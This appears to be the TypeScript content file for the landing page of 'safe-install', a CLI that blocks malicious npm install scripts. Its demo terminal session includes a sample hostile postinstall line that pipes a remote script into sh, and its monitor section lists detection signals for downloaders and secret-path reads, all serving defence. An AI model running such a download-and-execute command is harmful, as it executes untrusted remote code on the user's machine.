import type { SiteContent } from './types';

/**
 * All user-facing prose, in one typed place.
 *
 * Values that are *facts* (rule IDs, exit codes, command strings) are imported
 * from `facts.ts` instead of being written here — see the JSX comments below.
 */
import { distribution, globalFlags } from './facts';

const REPO_URL = 'https://github.com/crossben/safe-install';
const RELEASES_URL = `${REPO_URL}/releases/latest`;
const SECURITY_URL = `${REPO_URL}/blob/main/SECURITY.md`;

export const en: SiteContent = {
  meta: {
    title: 'safe-install — Install dependencies. Not malware.',
    description:
      'safe-install is an open-source CLI that stops malicious npm, pnpm, Yarn and bun install scripts before they run. Linux, macOS and Windows. Apache-2.0.',
    ogAlt: 'safe-install — install dependencies, not malware',
  },

  nav: [
    { label: 'Problem', href: '#problem' },
    { label: 'How it works', href: '#how-it-works' },
    { label: 'Rules', href: '#checks' },
    { label: 'Package managers', href: '#package-managers' },
    { label: 'Why Go?', href: '#why-go' },
    { label: 'Runtime monitor', href: '#monitor' },
    { label: 'CI', href: '#ci' },
    { label: 'Install', href: '#install' },
  ],

  hero: {
    promise: 'Install dependencies. Not malware.',
    subline:
      'A drop-in replacement for npm, pnpm, Yarn and bun that installs your dependency tree with every lifecycle script switched off — then shows you the ones that wanted to run, and asks before executing a single one.',
    primaryCta: { label: 'View on GitHub', href: REPO_URL, external: true },
    secondaryCta: { label: 'How it works', href: '#how-it-works' },

    installTabs: [
      {
        os: 'macOS',
        samples: [
          { label: 'Homebrew', lang: 'bash', code: distribution.value.homebrew },
        ],
      },
      {
        os: 'Linux',
        samples: [
          {
            label: '.deb',
            lang: 'bash',
            code: 'curl -LO https://github.com/crossben/safe-install/releases/latest/download/safe-install_0.1.0_linux_amd64.deb\nsudo dpkg -i safe-install_0.1.0_linux_amd64.deb',
          },
          { label: '.rpm', lang: 'bash', code: distribution.value.rpm },
        ],
      },
      {
        os: 'Windows',
        samples: [{ label: 'Scoop', lang: 'powershell', code: distribution.value.scoop }],
      },
    ],

    terminalTitle: 'zsh — ~/projects/app',
    // Illustrative session: the shape, rule IDs and commands are all real,
    // the package name and its numbers are a worked example.
    terminalLines: [
      { text: '$ safe-install', tone: 'prompt' },
      { text: '' },
      { text: '  safe-install  ·  npm  ·  412 packages from package-lock.json', tone: 'muted' },
      { text: '' },
      { text: '  Analyzing dependency tree…', tone: 'muted' },
      { text: '' },
      { text: '  ⚠ dotenv-helper@4.2.1  ·  risk 74  ·  high', tone: 'danger' },
      { text: '    SI-SCR-002  script downloads and executes remote code       block', tone: 'danger' },
      { text: '      postinstall: curl -fsSL https://cdn.example.net/i.sh | sh', tone: 'muted' },
      { text: '    SI-REC-001  version published 3h ago                        medium', tone: 'warn' },
      { text: '    SI-POP-002  4 weekly downloads                              medium', tone: 'warn' },
      { text: '' },
      { text: '  412 packages  ·  7 want to run install scripts  ·  6 approved by policy', tone: 'info' },
      { text: '' },
      { text: '  ?  dotenv-helper@4.2.1 — run this script?', tone: 'info' },
      { text: '    ❯ Block it', tone: 'ok' },
      { text: '      Run it once and remember', tone: 'muted' },
      { text: '      Show me the script first', tone: 'muted' },
      { text: '' },
      { text: '$ _', tone: 'prompt' },
    ],
    footnote: 'Illustrative session. Rule IDs and commands are real; the package is an example.',
  },

  problem: {
    eyebrow: 'The problem',
    heading: 'Installing a dependency is running code.',
    lede: 'Most people picture `npm install` as downloading files. For a large part of the ecosystem, it is also executing them — and it does so for packages you never typed, deep in a tree you never read.',
    points: [
      {
        title: 'Three fields, unlimited reach',
        body: '`preinstall`, `install` and `postinstall` run automatically. Any package in the tree can declare them, including packages that arrived as a transitive dependency of something you did ask for.',
      },
      {
        title: 'A compromised maintainer is enough',
        body: 'The package you have used for years publishes a normal-looking version. Its install script now phones home. You did not change anything, and the lockfile diff looks like a version bump.',
      },
      {
        title: 'Reviewing every script is not a strategy',
        body: 'A real application pulls hundreds of packages. Auditing each install script by hand does not scale, so in practice nobody does — which is exactly the gap attackers aim for.',
      },
    ],
    kicker: 'safe-install closes that door by default, and opens it only for scripts you approved.',
  },

  howItWorks: {
    eyebrow: 'How it works',
    heading: 'Control first. Observe second.',
    lede: 'Downloading and extracting a tarball is harmless. Executing it is not. safe-install separates the two, which is why the same approach works identically on Linux, macOS and Windows.',
    steps: [
      {
        id: 'analyze',
        title: 'Analyze',
        body: 'Read the lockfile, resolve the entire dependency tree, pull registry metadata, and score every package for risk — before anything has been executed.',
      },
      {
        id: 'install',
        title: 'Install',
        body: 'Run your package manager with all lifecycle scripts disabled. Tarballs are downloaded and extracted exactly as they normally would be, minus the code execution.',
      },
      {
        id: 'inspect',
        title: 'Inspect',
        body: 'List every package that wants to run a script and show you the script itself, flagged with the rules it trips and the evidence behind each one.',
      },
      {
        id: 'approve',
        title: 'Approve',
        body: 'You approve per package@version, interactively or through a policy file your team commits. Approvals pin to the script’s content hash.',
      },
      {
        id: 'run',
        title: 'Run',
        body: 'Execute only the scripts you approved, using each package manager’s own rebuild path. On Linux, optionally under the runtime monitor.',
      },
    ],
    note: 'Every step is a plain CLI invocation — nothing is cached between runs and nothing is left running afterwards.',
  },

  checks: {
    eyebrow: 'What it checks',
    heading: 'Thirteen rules, five questions.',
    lede: 'Every finding carries a rule ID, a severity and the evidence that triggered it — so you can look up exactly why something was flagged and decide for yourself.',
    families: [
      {
        id: 'scripts',
        title: 'What does the script actually do?',
        blurb: 'The script itself is the attack surface, so its contents are read and inspected.',
      },
      {
        id: 'recency',
        title: 'Did something just change hands?',
        blurb: 'Brand-new releases and sudden maintainer changes are where most hijacks show up first.',
      },
      {
        id: 'popularity',
        title: 'Is this name real, or is it a typo?',
        blurb: 'Names close to popular packages and packages nobody has heard of both get a second look.',
      },
      {
        id: 'integrity',
        title: 'Does the bytes match the promise?',
        blurb: 'The lockfile’s integrity hash and the resolved URL are checked against the registry.',
      },
      {
        id: 'maintenance',
        title: 'Is this package still maintained?',
        blurb: 'Deprecated packages and versions that have been unpublished are surfaced rather than silently installed.',
      },
      {
        id: 'vulns',
        title: 'Is this a known-bad version?',
        blurb: 'Published advisories are matched against the exact resolved version.',
      },
    ],
    severities: [
      { id: 'block', label: 'Block', description: 'Blocked outright, whatever the total score.' },
      { id: 'high', label: 'High', description: 'Counts toward the risk score and fails a CI run by default.' },
      { id: 'medium', label: 'Medium', description: 'Counts toward the risk score.' },
      { id: 'low', label: 'Low', description: 'Reported for information.' },
      { id: 'advisory', label: 'Per advisory', description: 'Severity comes from the advisory itself.' },
    ],
    scoringNote: 'Scores are a weighted sum capped at 100: below 30 is low, 30–59 is medium, 60 and above is high.',
    explainNote: 'Not sure what a rule means? `safe-install explain SI-SCR-002` tells you.',
  },

  packageManagers: {
    eyebrow: 'Works with your package manager',
    heading: 'One interface, five adapters.',
    lede: 'safe-install does not reimplement npm. It drives whichever package manager your project already uses, with scripts switched off, and calls that manager’s own rebuild command for the scripts you approve.',
    columns: [
      { key: 'name', label: 'Package manager' },
      { key: 'lockfile', label: 'Lockfile' },
      { key: 'disableScripts', label: 'Scripts disabled' },
      { key: 'runApproved', label: 'Run approved' },
    ],
    detectionNote:
      'Detected automatically — by which lockfile is present, then the `packageManager` field in `package.json`, then the `--pm` flag if you need to be explicit.',
  },

  whyGo: {
    eyebrow: 'Why Go?',
    heading: 'The boring language, on purpose.',
    lede: 'A security tool should not be interesting. It should start instantly, run on a machine with nothing installed, and be simple enough to audit. Go was the choice that made all three cheap.',
    reasons: [
      {
        title: 'One static binary per OS and architecture',
        body: 'No runtime, no package manager, no `node` on the target machine. A single ~10 MB file runs the same on a developer laptop, a locked-down CI runner and a production container.',
      },
      {
        title: 'Cross-compilation is not a project',
        body: 'Building all of Linux, macOS and Windows across amd64 and arm64 is one GoReleaser config and one CI workflow. Most projects treat multi-platform binaries as a reason to pick a different language.',
      },
      {
        title: 'Concurrent registry lookups without ceremony',
        body: 'Analyzing a few hundred packages means a few hundred registry requests. Go’s runtime makes that a loop over goroutines with a shared cache, not an async framework.',
      },
      {
        title: 'It shares an ecosystem with tools you already trust',
        body: 'osv-scanner, trivy and grype are all Go. The advisory databases, the scanning patterns and the prior art are already written in the same language, in projects with comparable threat models.',
      },
      {
        title: 'Few dependencies, on purpose',
        body: 'Lockfile formats are parsed with the standard library, not a framework. A tool that asks you to trust it with your supply chain should not also ask you to trust forty transitive packages.',
      },
    ],
    comparisonHeading: 'The honest version',
    comparisonRows: [
      {
        language: 'Go',
        verdict: 'Shipped',
        note: 'Single static binary, trivial cross-compilation, and a security tooling ecosystem to borrow from.',
      },
      {
        language: 'Rust',
        verdict: 'A close second',
        note: 'Would give the same single binary and arguably better guarantees, but a smaller security-tool ecosystem and a longer path to shipping everywhere at once.',
      },
      {
        language: 'Node / TypeScript',
        verdict: 'The wrong shape',
        note: 'Natural for a JavaScript tool, and the worst option here: it would ship through npm — the exact channel this tool exists to protect — and force a runtime install on every user.',
      },
    ],
    notViaNpmHeading: 'Deliberately not distributed via npm',
    notViaNpmBody:
      'A supply-chain security tool installed through the supply chain it protects is a weak story. If you install safe-install from npm, a compromised npm can hand you a compromised safe-install — and the one tool you were relying on is the thing that got through. Homebrew, Scoop and signed release artifacts instead.',
    releaseHeading: 'Signed, and reproducible',
    releaseBody:
      'Releases are built with GoReleaser and GitHub Actions, published with cosign keyless signatures and SLSA provenance, and built reproducibly with -trimpath so anyone can rebuild the same bytes from the same source.',
  },

  monitor: {
    eyebrow: 'Linux only — the runtime monitor',
    heading: 'Watch what the approved script actually does.',
    lede: 'Static analysis tells you what a script is written to do. The runtime monitor tells you what it did. On approved scripts, safe-install can observe them live and report — or kill — anything suspicious.',
    howHeading: 'Two backends, one set of signals',
    backendBody:
      'When CAP_BPF or root is available, eBPF tracepoints on sys_enter_execve, connect and openat give direct kernel-level visibility. Without them, safe-install falls back to strace -f, tracing the same three syscalls. With neither, the monitor reports that it is unavailable rather than pretending it is watching.',
    signalsHeading: 'What it watches for',
    actionBody:
      'By default the monitor only reports. Pass --monitor=kill and a high-severity event takes down the whole process tree, which is what you want when a script you approved turns out not to be the script you read.',
    signals: [
      'Unexpected network destinations — anything that is not the registry',
      'Spawning shells and downloaders',
      'Reads of secret paths',
      'Writes outside the project, `node_modules` and the cache',
      'Writes to shell rc files, `~/.ssh`, `/etc`, cron and systemd units',
    ],
    copy: {
      neutral: 'Checking your platform…',
      roasts: {
        windows: {
          headline: "Want this too? Too bad, you're on Windows.",
          jabs: [
            'Your antivirus is busy scanning `node_modules` anyway. Give it a moment… or a week.',
            'It would have to be a third-party ETW provider, and the signing process alone is a rite of passage.',
          ],
          cta: "Dual-boot. We'll wait.",
        },
        macos: {
          headline: "Want this too? Too bad, you're on a Mac.",
          jabs: [
            'Endpoint Security entitlements cost more than your dongles.',
            'System Extensions need a full install, a user prompt, and a notarization ticket — a lot of ceremony for a curl|sh detector.',
          ],
          cta: "There's a VM for that.",
        },
        linux: {
          headline: "You're on Linux. Of course it works.",
          jabs: [
            'eBPF if you have CAP_BPF, strace if you do not. Both are already here, in the kernel, waiting for us.',
          ],
          isSmug: true,
        },
        unknown: {
          headline: 'We could not tell what you are running.',
          jabs: [
            'Your user agent gave nothing away, which honestly is its own kind of security posture.',
          ],
        },
      },
      honest: 'Everything else in safe-install works the same on all three.',
    },
  },

  ci: {
    eyebrow: 'CI',
    heading: 'Fail the build, not your afternoon.',
    lede: 'In CI, safe-install runs non-interactively: no prompts, a machine-readable report, and an exit code your pipeline can branch on.',
    commandHeading: 'The whole check',
    exitCodesHeading: 'Exit codes',
    exitCodesNote: 'Stable contract for pipelines — the names below are the four the tool promises to return.',
    workflowTitle: '.github/workflows/supply-chain.yml',
    workflow: {
      label: 'GitHub Actions',
      lang: 'yaml',
      code: `name: supply-chain

on: [push, pull_request]

jobs:
  audit:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: 22
      - run: npm ci
      - name: Check dependency tree
        run: safe-install check --ci --format=sarif
      - name: Upload SARIF
        if: always()
        uses: github/codeql-action/upload-sarif@v3
        with:
          sarif_file: safe-install.sarif`,
    },
    flagNote: `Also available: ${globalFlags.value.join(' · ')}`,
  },

  install: {
    eyebrow: 'Install',
    heading: 'Get the binary.',
    lede: 'One static binary per platform, published as a signed release artifact. Pick whichever channel matches how you already manage machines.',
    methods: [
      {
        id: 'homebrew',
        title: 'Homebrew',
        summary: 'macOS and Linux, via the tap.',
        samples: [{ label: 'brew', lang: 'bash', code: distribution.value.homebrew }],
      },
      {
        id: 'scoop',
        title: 'Scoop',
        summary: 'Windows.',
        samples: [{ label: 'powershell', lang: 'powershell', code: distribution.value.scoop }],
      },
      {
        id: 'packages',
        title: '.deb and .rpm',
        summary: 'Linux packages with a system package manager.',
        samples: [
          { label: 'Debian / Ubuntu', lang: 'bash', code: distribution.value.deb },
          { label: 'Fedora / RHEL', lang: 'bash', code: distribution.value.rpm },
        ],
      },
      {
        id: 'verify',
        title: 'Direct download, verified',
        summary: 'Every release ships a checksum and a cosign keyless signature. Verify before you run it.',
        samples: [
          {
            label: 'verify',
            lang: 'bash',
            code: `curl -LO https://github.com/crossben/safe-install/releases/latest/download/safe-install_0.1.0_linux_amd64.tar.gz
curl -LO https://github.com/crossben/safe-install/releases/latest/download/safe-install_0.1.0_linux_amd64.tar.gz.sig
curl -LO https://github.com/crossben/safe-install/releases/latest/download/safe-install_0.1.0_linux_amd64.tar.gz.pem

cosign verify-blob \\
  --certificate safe-install_0.1.0_linux_amd64.tar.gz.pem \\
  --certificate-identity '${distribution.value.keylessIdentity}' \\
  --certificate-oidc-issuer '${distribution.value.keylessIssuer}' \\
  safe-install_0.1.0_linux_amd64.tar.gz.sig

tar xzf safe-install_0.1.0_linux_amd64.tar.gz
sudo install safe-install /usr/local/bin/`,
          },
        ],
      },
    ],
    dropInNote:
      'There is deliberately no npm package. A supply-chain security tool installed through the channel it protects is a weak story — Homebrew, Scoop and signed binaries instead.',
  },

  footer: {
    tagline: 'Install dependencies. Not malware.',
    securityHeading: 'Found a bypass?',
    securityBody:
      'Please tell us privately through SECURITY.md rather than opening a public issue. We would much rather fix it quietly than ship a workaround on your behalf.',
    telemetryBody:
      'No telemetry, ever — not usage counts, not crash reports, not IP addresses. This site has no analytics and no third-party scripts either.',
    links: [
      { label: 'GitHub', href: REPO_URL },
      { label: 'Releases', href: RELEASES_URL },
      { label: 'SECURITY.md', href: SECURITY_URL },
      { label: 'Apache-2.0', href: `${REPO_URL}/blob/main/LICENSE` },
    ],
  },
};